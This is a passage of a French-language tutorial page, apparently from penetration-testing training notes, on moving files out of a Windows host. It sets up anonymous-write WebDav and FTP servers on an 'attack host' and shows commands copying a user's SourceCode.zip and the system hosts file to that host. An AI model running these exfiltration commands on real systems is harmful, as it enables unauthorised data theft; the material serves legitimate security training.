+<p><img alt="" src="./capture/2.png" /></p>
+<h4 id="configuration-du-serveur-webdav">Configuration du serveur WebDav</h4>
+<p>Pour configurer notre serveur WebDav, nous devons installer deux modules Python, wsgidav et cheroot ( vous pouvez en savoir plus sur cette implémentation ici: <a href="https://github.com/mar10/wsgidav">wsgidav github</a>)). </p>
+<p>Après les avoir installés, nous exécutons le wsgidav application dans le répertoire cible.</p>
+<h3 id="installation-des-modules-webdav-python">Installation des modules WebDav Python</h3>
+<pre><code class="language-sh">admin@pc[/pc]$ sudo pip install wsgidav cheroot
+
+[sudo] password for plaintext: 
+Collecting wsgidav
+  Downloading WsgiDAV-4.0.1-py3-none-any.whl (171 kB)
+     |████████████████████████████████| 171 kB 1.4 MB/s
+     ...SNIP...
+</code></pre>
+<h3 id="utilisation-du-module-webdav-python">Utilisation du module WebDav Python</h3>
+<pre><code class="language-sh">admin@pc[/pc]$ sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous 
+
+[sudo] password for plaintext: 
+Running without configuration file.
+10:02:53.949 - WARNING : App wsgidav.mw.cors.Cors(None).is_disabled() returned True: skipping.
+10:02:53.950 - INFO    : WsgiDAV/4.0.1 Python/3.9.2 Linux-5.15.0-15parrot1-amd64-x86_64-with-glibc2.31
+10:02:53.950 - INFO    : Lock manager:      LockManager(LockStorageDict)
+10:02:53.950 - INFO    : Property manager:  None
+10:02:53.950 - INFO    : Domain controller: SimpleDomainController()
+10:02:53.950 - INFO    : Registered DAV providers by route:
+10:02:53.950 - INFO    :   - '/:dir_browser': FilesystemProvider for path '/usr/local/lib/python3.9/dist-packages/wsgidav/dir_browser/htdocs' (Read-Only) (anonymous)
+10:02:53.950 - INFO    :   - '/': FilesystemProvider for path '/tmp' (Read-Write) (anonymous)
+10:02:53.950 - WARNING : Basic authentication is enabled: It is highly recommended to enable SSL.
+10:02:53.950 - WARNING : Share '/' will allow anonymous write access.
+10:02:53.950 - WARNING : Share '/:dir_browser' will allow anonymous read access.
+10:02:54.194 - INFO    : Running WsgiDAV/4.0.1 Cheroot/8.6.0 Python 3.9.2
+10:02:54.194 - INFO    : Serving on http://0.0.0.0:80 ...
+</code></pre>
+<h3 id="connexion-au-partage-webdav">Connexion au partage Webdav</h3>
+<p>Nous pouvons maintenant essayer de nous connecter au partage en utilisant le DavWWWRoot répertoire.</p>
+<pre><code class="language-powershell">C:\pc&gt; dir \\192.168.49.128\DavWWWRoot
+
+ Volume in drive \\192.168.49.128\DavWWWRoot has no label.
+ Volume Serial Number is 0000-0000
+
+ Directory of \\192.168.49.128\DavWWWRoot
+
+05/18/2022  10:05 AM    &lt;DIR&gt;          .
+05/18/2022  10:05 AM    &lt;DIR&gt;          ..
+05/18/2022  10:05 AM    &lt;DIR&gt;          sharefolder
+05/18/2022  10:05 AM                13 filetest.txt
+               1 File(s)             13 bytes
+               3 Dir(s)  43,443,318,784 bytes free
+</code></pre>
+<blockquote>
+<p>Remarque: DavWWWRoot est un mot clé spécial reconnu par Windows Shell. Aucun dossier de ce type n'existe sur votre serveur WebDAV. Le mot clé DavWWRoot indique au pilote Mini-Redirector, qui gère les demandes WebDAV que vous vous connectez à la racine du serveur WebDAV.</p>
+<p>Vous pouvez éviter d'utiliser ce mot-clé si vous spécifiez un dossier qui existe sur votre serveur lors de la connexion au serveur. Par exemple: \ 192.168.49.128 \ sharefolder</span></p>
+</blockquote>
+<h3 id="telechargement-de-fichiers-a-laide-de-smb">Téléchargement de fichiers à l'aide de SMB</h3>
+<pre><code class="language-powershell">C:\pc&gt; copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
+C:\pc&gt; copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
+</code></pre>
+<blockquote>
+<p>Remarque: S'il n'y a pas de restrictions SMB ( TCP / 445 ), vous pouvez utiliser impacket-smbserver de la même manière que nous l'avons configuré pour les opérations de téléchargement.</p>
+</blockquote>
+<h2 id="telechargements-ftp_1">Téléchargements FTP</h2>
+<p>Le téléchargement de fichiers à l'aide de FTP est très similaire au téléchargement de fichiers. </p>
+<p>Nous pouvons utiliser PowerShell ou le client FTP pour executer l'opération. </p>
+<p>Avant de démarrer notre serveur FTP à l'aide du module Python pyftpdlib, nous devons spécifier l'option --write pour permettre aux clients de télécharger des fichiers sur notre hôte d'attaque.</p>
+<pre><code class="language-sh">admin@pc[/pc]$ sudo python3 -m pyftpdlib --port 21 --write
+
+/usr/local/lib/python3.9/dist-packages/pyftpdlib/authorizers.py:243: RuntimeWarning: write permissions assigned to anonymous user.
+  warnings.warn(&quot;write permissions assigned to anonymous user.&quot;,
+[I 2022-05-18 10:33:31] concurrency model: async
+[I 2022-05-18 10:33:31] masquerade (NAT) address: None
+[I 2022-05-18 10:33:31] passive ports: None
+[I 2022-05-18 10:33:31] &gt;&gt;&gt; starting FTP server on 0.0.0.0:21, pid=5155 &lt;&lt;&lt;
+</code></pre>
+<p>Utilisons maintenant la fonction de téléchargement PowerShell pour télécharger un fichier sur notre serveur FTP.</p>
+<h3 id="fichier-de-telechargement-powershell">Fichier de téléchargement PowerShell</h3>
+<pre><code class="language-powershell">PS C:\pc&gt; (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
+</code></pre>
+<h3 id="creer-un-fichier-de-commande-pour-le-client-ftp-pour-telecharger-un-fichier">Créer un fichier de commande pour le client FTP pour télécharger un fichier</h3>
+<pre><code class="language-powershell">C:\pc&gt; echo open 192.168.49.128 &gt; ftpcommand.txt
+C:\pc&gt; echo USER anonymous &gt;&gt; ftpcommand.txt
+C:\pc&gt; echo binary &gt;&gt; ftpcommand.txt
+C:\pc&gt; echo PUT c:\windows\system32\drivers\etc\hosts &gt;&gt; ftpcommand.txt
+C:\pc&gt; echo bye &gt;&gt; ftpcommand.txt
+C:\pc&gt; ftp -v -n -s:ftpcommand.txt
+ftp&gt; open 192.168.49.128
+
+Log in with USER and PASS first.
+
+
+ftp&gt; USER anonymous
+ftp&gt; PUT c:\windows\system32\drivers\etc\hosts
+ftp&gt; bye
+</code></pre></div>
+            </div>
+        </div>
+
+        <footer class="col-md-12">
+            <hr>
+            <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a>.</p>
+        </footer>
+        <script src="../../js/jquery-3.6.0.min.js"></script>
+        <script src="../../js/bootstrap.min.js"></script>
+        <script>
+            var base_url = "../..",
+                shortcuts = {"help": 191, "next": 78, "previous": 80, "search": 83};
+        </script>
+        <script src="../../js/base.js"></script>
+        <script src="../../search/main.js"></script>
+
+        <div class="modal" id="mkdocs_search_modal" tabindex="-1" role="dialog" aria-labelledby="searchModalLabel" aria-hidden="true">
+    <div class="modal-dialog modal-lg">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h4 class="modal-title" id="searchModalLabel">Search</h4>
+                <button type="button" class="close" data-dismiss="modal"><span aria-hidden="true">&times;</span><span class="sr-only">Close</span></button>
+            </div>
+            <div class="modal-body">
+                <p>From here you can search these documents. Enter your search terms below.</p>
+                <form>
+                    <div class="form-group">
+                        <input type="search" class="form-control" placeholder="Search..." id="mkdocs-search-query" title="Type search term here">
+                    </div>
+                </form>
+                <div id="mkdocs-search-results" data-no-results-text="No results found"></div>
+            </div>
+            <div class="modal-footer">
+            </div>
+        </div>
+    </div>
+</div><div class="modal" id="mkdocs_keyboard_modal" tabindex="-1" role="dialog" aria-labelledby="keyboardModalLabel" aria-hidden="true">
+    <div class="modal-dialog">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h4 class="modal-title" id="keyboardModalLabel">Keyboard Shortcuts</h4>
+                <button type="button" class="close" data-dismiss="modal"><span aria-hidden="true">&times;</span><span class="sr-only">Close</span></button>
+            </div>
+            <div class="modal-body">
+              <table class="table">
+                <thead>
+                  <tr>
+                    <th style="width: 20%;">Keys</th>
+                    <th>Action</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td class="help shortcut"><kbd>?</kbd></td>
+                    <td>Open this help</td>
+                  </tr>
+                  <tr>
+                    <td class="next shortcut"><kbd>n</kbd></td>
+                    <td>Next page</td>
+                  </tr>
+                  <tr>
+                    <td class="prev shortcut"><kbd>p</kbd></td>
+                    <td>Previous page</td>
+                  </tr>
+                  <tr>
+                    <td class="search shortcut"><kbd>s</kbd></td>
+                    <td>Search</td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+            <div class="modal-footer">
+            </div>
+        </div>
+    </div>
+</div>
+
+    </body>
+</html>
